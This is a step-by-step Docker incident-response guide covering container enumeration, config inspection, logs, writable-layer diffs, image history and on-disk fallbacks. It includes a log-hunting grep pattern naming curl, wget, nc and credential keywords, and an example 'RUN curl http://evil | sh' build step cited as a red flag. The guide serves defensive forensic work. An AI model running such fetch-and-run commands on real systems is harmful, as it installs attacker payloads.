# Investigating Docker

The step-by-step field flow for a Docker host — *what to run first, then next*, the way an analyst actually works a case. You start broad (is Docker here, what's running), narrow to the suspect container, inspect how it was configured and what it did, pull the evidence out, then examine the image behind it — and when the runtime is gone or can't be trusted, drop to the on-disk artifacts and the host `/proc`. Read **Docker → Architecture and Components** first for the *why* behind each step; this note is the *how*.

> 🔴 Work outside-in: **orient → enumerate → find the suspect → inspect config → read output → diff the writable layer → examine the image → correlate to the host.** And always keep the host-side fallback in mind: a `docker` CLI can be lied to or the container `rm`'d, but `/var/lib/docker/...` config, logs, and the overlay `diff/` survive on disk, and the process is still on the host `/proc` via its cgroup.

## Contents

- [Quick Triage](#quick-triage)
- [Step 1 Orient](#step-1-orient)
- [Step 2 Enumerate What Exists](#step-2-enumerate-what-exists)
- [Step 3 Find the Suspect Container](#step-3-find-the-suspect-container)
- [Step 4 Inspect the Container](#step-4-inspect-the-container)
- [Step 5 Read the Logs](#step-5-read-the-logs)
- [Step 6 What It Changed diff and cp](#step-6-what-it-changed-diff-and-cp)
- [Step 7 Examine the Image](#step-7-examine-the-image)
- [Host-Side Artifacts When the Runtime Is Gone](#host-side-artifacts-when-the-runtime-is-gone)
- [Correlate to the Host](#correlate-to-the-host)
- [Getting Max Value](#getting-max-value)
- [Correlate With](#correlate-with)
- [Red Flags](#red-flags)
- [Resources](#resources)

## Quick Triage

```bash
# Is Docker here and running, and what's the shape of it?
docker version; docker info 2>/dev/null | grep -Ei 'Containers|Images|Storage Driver|Root Dir'

# The three enumerations to run first
docker image ls; docker container ls -a; docker network ls

# The two highest-signal reds: a container burning CPU (miner), and a privileged one
docker stats --no-stream 2>/dev/null | sort -k3 -hr | head
grep -l '"Privileged":true' /var/lib/docker/containers/*/hostconfig.json 2>/dev/null
```

## Step 1 Orient

Establish that Docker is present, the daemon is up, and where its data lives — everything downstream depends on it.

```bash
# Client + daemon versions, and daemon health
docker version

docker info                      # storage driver, root dir, # containers/images, log driver

# How much is here (quick scale check)
docker system df
```

If the daemon is down or the `docker` CLI is missing/untrusted, skip to **Host-Side Artifacts** and work from `/var/lib/docker` directly.

## Step 2 Enumerate What Exists

Inventory images, containers, networks, and volumes — this is the "what am I looking at" pass.

```bash
# Images available on the device
docker image ls                  # add -a for intermediate layers; --digests for the sha256

# Containers on the device — RUNNING and stopped (attacker containers often exited)
docker container ls              # running only
docker container ls -a           # 🔴 include stopped/exited — don't miss a rm-pending container

# Network configurations
docker network ls                # then: docker network inspect <net>

# Named volumes (persistent data that outlives containers)
docker volume ls
```

🔴 Read `docker container ls -a`, not just `ps` — a cryptominer or recon container frequently **exits** after doing its job, and a running-only view misses it. Odd image names, images pulled from unexpected registries, `latest`-tagged one-offs, and long-idle exited containers are your shortlist.

## Step 3 Find the Suspect Container

Narrow the inventory to the container worth investigating.

```bash
# CPU/mem per container — a miner pins CPU
docker stats --no-stream

# Anything privileged, host-networked, or socket-mounted (escape-capable)
for c in $(docker ps -aq); do
  docker inspect -f '{{.Name}} priv={{.HostConfig.Privileged}} net={{.HostConfig.NetworkMode}} pid={{.HostConfig.PidMode}}' "$c"
done

# Containers with a bind of the docker socket or host root
grep -lE '/var/run/docker.sock|"/",|:/host' /var/lib/docker/containers/*/hostconfig.json 2>/dev/null
```

## Step 4 Inspect the Container

Pull the full definition of the suspect: image, command, env, mounts, privileges, network — *how it was configured*.

```bash
# The complete container definition (image, Cmd, Env, Mounts, Privileged, Caps, Ports)
docker inspect <container>

# Just the security-relevant fields
docker inspect -f 'img={{.Config.Image}} cmd={{.Config.Cmd}} priv={{.HostConfig.Privileged}} caps={{.HostConfig.CapAdd}} binds={{.HostConfig.Binds}}' <container>

# Processes RUNNING INSIDE the container, with any ps arguments you like
docker container top <container>              # default columns
docker container top <container> aux          # 🔴 full ps view — spot the miner/shell inside
docker container top <container> -eo pid,ppid,user,cmd

# Published ports (a backdoor listener shows here)
docker port <container>
```

🔴 `docker container top <container> [ps args]` runs `ps` *against the container's processes from the host* — the fastest way to see what's actually executing inside (a `xmrig`, a `/bin/sh`, a reverse shell) without entering it. The `Env` and `Cmd` from `docker inspect` frequently hold the C2 URL, a token, or the exact command.

## Step 5 Read the Logs

The container's stdout/stderr is often a transcript of what the attacker did.

```bash
# The container's output (default json-file driver)
docker logs <container>
docker logs --timestamps --tail 200 <container>

# Straight from disk (works even if the CLI is untrusted / container removed)
cat /var/lib/docker/containers/<id>/<id>-json.log

# Hunt payload behaviour across ALL container logs
grep -Ei 'curl|wget|/bin/sh|/bin/bash|base64|nc |stratum|password|token' /var/lib/docker/containers/*/*-json.log
```

🔴 If `docker logs` is empty but the container clearly did things, check `daemon.json` — the `log-driver` may have been set to `none` (suppression) or `journald`/remote (look there instead).

## Step 6 What It Changed diff and cp

The writable layer is the runtime changelog — see what the container added/changed, then extract it. This is **container drift** (or **drift detection**) — comparing a running container's filesystem against the image it was started from to surface anything the attacker (or a compromised process) added, changed, or deleted at runtime.

```bash
# Files the container ADDED (A) / CHANGED (C) / DELETED (D) vs its image
docker diff <container>

# Copy a suspect file OUT of the container to your case dir for analysis
docker cp <name>:/path/to/copy /tmp/
docker cp <name>:/tmp/xmrig /cases/docker/output/

# Or read the writable layer directly on the host (survives docker rm)
find "$(docker inspect -f '{{.GraphDriver.Data.UpperDir}}' <container>)" -type f -ls 2>/dev/null | sort -k8
```

🔴 `docker diff` surfaces exactly what the container wrote at runtime — a dropped miner, a webshell in the web root, an added `authorized_keys`, a modified binary. `docker cp <name>:/path /tmp` pulls the artifact out **without executing it** so you can hash and triage it (→ ELF and Malware Triage).

## Step 7 Examine the Image

Behind the container is an image — inspect how it was *built*, because the malicious payload is often baked in.

```bash
# The build history — one line per Dockerfile instruction (spot an injected RUN)
docker history <container_name>               # or the image name/id
docker history --no-trunc <image>             # full commands, untruncated

# Compare / analyze an image's history and structure (Google container-diff)
container-diff analyze -t history daemon://image_name
container-diff analyze -t file -t apt daemon://image_name     # files + packages too
container-diff diff daemon://image_a daemon://image_b -t file  # what differs between two images
```

🔴 `docker history` exposes the build steps — a `RUN curl http://evil | sh`, a baked-in backdoor, or credentials added at build time show up here. `container-diff analyze -t history daemon://image_name` gives a structured view of the image's history/files/packages, and the full `docker save` → layer-by-layer unpack is in the **Image and Layer Analysis** note.

## Host-Side Artifacts When the Runtime Is Gone

When the container was `rm`'d, the daemon is down, or the CLI can't be trusted — everything you need is still on the host disk under `/var/lib/docker/`.

```bash
# How the (now-deleted) container was configured
cat /var/lib/docker/containers/<id>/config.v2.json | python3 -m json.tool | less
#   .Config.Env / .Config.Cmd / .Config.Entrypoint / .Created / .MountPoints / .Name / .Image

# The security-relevant host config
cat /var/lib/docker/containers/<id>/hostconfig.json | python3 -m json.tool
#   .Privileged / .CapAdd / .Binds / .NetworkMode / .PidMode / .PortBindings

# Its output log
cat /var/lib/docker/containers/<id>/<id>-json.log

# Its writable layer (what it wrote)
find /var/lib/docker/overlay2/*/diff/ -type f \( -perm -111 -o -name '*.sh' -o -name '*.so' \) -ls 2>/dev/null
```

🔴 `config.v2.json` + `hostconfig.json` reconstruct a **deleted** container's exact configuration — including whether it was privileged and which host paths it could touch — and the overlay `diff/` still holds what it wrote. On a mounted host image, prefix all of these with `/mnt/evidence`.

## Correlate to the Host

A container is host processes — tie it back so every Linux `/proc` technique applies.

```bash
# The container's processes as host PIDs
docker top <container>
docker inspect -f '{{.State.Pid}}' <container>          # container PID-1 as a host PID

# From a suspicious HOST PID -> which container
grep -oE 'docker[-/][0-9a-f]{64}|[0-9a-f]{64}' /proc/<host_pid>/cgroup

# Do the full /proc workup on the container process, from the host
ls -l /proc/<host_pid>/exe; cat /proc/<host_pid>/environ | tr '\0' '\n'

# Enter the container's namespaces read-only (no runtime needed)
nsenter -t <host_pid> -m -p -- ls -la /
```

## Getting Max Value

- **Enumerate `-a`** — stopped/exited containers are where the one-shot attacker container hides.
- **`docker cp` beats executing** — pull suspect files out to a case dir, then hash/YARA them offline.
- **`docker diff` + the overlay `diff/`** are the runtime changelog — the single fastest "what did it do" on disk.
- **Keep the host-side fallback ready** — `/var/lib/docker/...` config/logs/overlay survive `docker rm` and a down daemon; the process survives on host `/proc`.
- **Preserve before you eradicate** — `docker save` the image and copy the container dir + overlay `diff/` to evidence (→ Image and Layer Analysis, Evidence Collection).

## Correlate With

| To go deeper on… | Pivot to |
|------------------|----------|
| How Docker's components/layout work | **Docker → Architecture and Components** |
| Unpack the image + hash layer contents | **Docker → Image and Layer Analysis** |
| Triage a file you `docker cp`'d out | **Linux → ELF and Malware Triage** (11b), **IOC and YARA** (11d) |
| The `/proc` workup of the container process | **Linux → Live Response** (10), **Process Trees** (10b) |
| A container that broke out to the host | **Escapes and Privilege Abuse** |
| Runtime behavioral detection (Falco/Tracee) | **Runtime Detection and Logging** |
| Proper acquisition + chain of custody | **Evidence Collection** |

## Red Flags

| 🔴 Finding | Why it matters |
|-----------|----------------|
| Exited container with an odd image / one-shot name | One-and-done attacker container |
| `docker container top` shows a miner/shell inside | Live payload in the container |
| `hostconfig.json` `Privileged:true` / `docker.sock` bind / `/:/host` | Escape-capable |
| `NetworkMode`/`PidMode` = `host` | Isolation removed |
| Dropped binary/webshell/key in `docker diff` / overlay `diff/` | Attacker activity captured on disk |
| `docker history` shows `RUN curl … | sh` or a baked-in backdoor | Malicious image build |
| Log driver `none` in `daemon.json` | Deliberate evidence suppression |
| Docker API exposed on `tcp://…:2375` | Common unauthenticated initial-access vector |

## Resources

- `docker` CLI reference — https://docs.docker.com/reference/cli/docker/
- container-diff — https://github.com/GoogleContainerTools/container-diff
- MITRE ATT&CK Containers — https://attack.mitre.org/matrices/enterprise/containers/
